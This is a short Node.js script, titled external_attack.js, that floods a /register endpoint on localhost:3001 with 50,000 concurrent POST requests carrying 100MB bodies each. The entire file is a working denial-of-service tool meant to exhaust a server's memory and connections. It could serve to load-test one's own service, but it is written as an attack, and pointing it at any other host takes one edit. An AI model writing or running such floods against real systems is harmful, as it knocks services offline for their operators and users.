// external_attack.js
const fetch = require('node-fetch');

const BIG_PAYLOAD = JSON.stringify({
  data: 'A'.repeat(100 * 1024 * 1024) // 100MB per request
});

const CONCURRENT_REQUESTS = 50000; // Massive concurrency

async function sendRequest(i) {
  try {
    await fetch('http://localhost:3001/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: BIG_PAYLOAD
    });
    console.log(`✅ ${i}`);
  } catch (err) {
    console.log(`❌ ${i} - dropped`);
  }
}

(async () => {
  const all = [];
  for (let i = 0; i < CONCURRENT_REQUESTS; i++) {
    all.push(sendRequest(i));
  }
  await Promise.all(all);
})();
